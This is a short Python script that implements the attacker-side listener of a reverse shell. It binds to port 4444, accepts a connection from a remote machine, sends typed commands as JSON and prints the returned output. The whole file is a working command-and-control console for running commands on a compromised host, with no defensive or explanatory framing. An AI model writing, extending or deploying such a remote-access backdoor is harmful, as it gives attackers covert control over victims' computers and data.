#!/usr/bin/env python
import socket
import subprocess
import json

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("\n[+] Waiting for incoming connection.\n")
        self.connection, address = listener.accept()
        print("\n[+] Connection accepted\n" + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()
        return self.reliable_receive()


    def run(self):
        while True:
            command = input(">>")
            command = command.split(" ")
            result = self.execute_remotely(command)
            print(result)




my_listener = Listener("127.0.0.1",4444)
my_listener.run()
